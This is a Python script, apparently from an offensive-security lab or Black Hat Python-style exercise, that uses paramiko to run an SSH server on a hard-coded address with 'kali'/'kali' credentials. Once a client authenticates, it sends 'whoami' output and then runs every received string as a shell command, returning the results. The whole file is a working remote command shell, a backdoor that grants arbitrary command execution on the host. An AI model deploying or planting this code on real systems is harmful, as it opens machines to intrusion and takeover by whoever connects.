import os
import paramiko
import socket
import sys
import threading
import subprocess

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # change here
        if (username == 'kali') and (password == 'kali'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '10.0.2.15' # change here
    ssh_port = 22
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listening failed: ' + str(e))
        sys.exit(1)
    else:
        print(f'[+] Got a connection from {addr}')

    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('[-] No channel.')
        sys.exit(1)

    print('[+] Authenticated')
    # print(chan.recv(1024).decode())
    whoami = subprocess.check_output("whoami", shell=True)
    chan.send(whoami)
    try:
        while True:
            command = chan.recv(4096)
            try:
                command = command.decode()
                if command == "exit":
                    chan.close()
                    break
                # com_list = command.split(" ")
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                if len(output.decode()) < 1:
                    output = b"[+] Executed successfully."
                chan.send(output)
            except subprocess.CalledProcessError as e:
                output = e.output
                chan.send(output)
    except KeyboardInterrupt:
        bhSession.close()
